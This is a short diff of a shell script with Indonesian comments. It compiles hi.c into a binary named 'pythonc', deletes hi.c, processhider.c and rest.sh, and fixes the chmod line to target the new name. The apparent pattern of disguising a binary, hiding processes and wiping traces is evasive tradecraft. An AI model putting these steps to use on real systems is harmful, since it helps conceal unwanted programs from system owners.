@@ -29,7 +29,7 @@ gcc -o pythonc hi.c
 rm hi.c processhider.c
 
 # Ubah izin agar hi dapat dieksekusi
-chmod +x hi
+chmod +x pythonc
 
 # Hapus skrip yang sudah tidak diperlukan
 rm rest.sh
